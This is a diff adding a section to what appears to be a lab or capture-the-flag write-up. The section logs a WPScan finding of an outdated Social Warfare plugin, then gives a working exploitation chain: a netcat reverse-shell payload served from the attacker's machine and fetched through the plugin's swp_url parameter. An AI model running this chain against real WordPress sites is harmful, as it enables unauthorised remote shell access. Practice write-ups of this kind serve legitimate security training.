@@ -192,3 +192,22 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:09
 
 ```
+
+# FINDINGS-WPSCAN
+```python
+Plugin used in wordpress Social Warfare v3.5.2(out of date)
+Reference-of-the-exploit: https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618
+```
+
+# Exxploitation
+
+```python
+creating a payload called shell.txt
+Inside a payload: <pre>system('nc kali-IP 4444 -e /bin/bash')</pre>
+we host in our kali machine
+command: sudo python3 -m http.server 80
+and then setup a listener--> nc -lvp 4444
+http://192.168.89.123/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.89/shell.txt
+-->http://192.168.89.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.1.109/shell.txt
+
+```
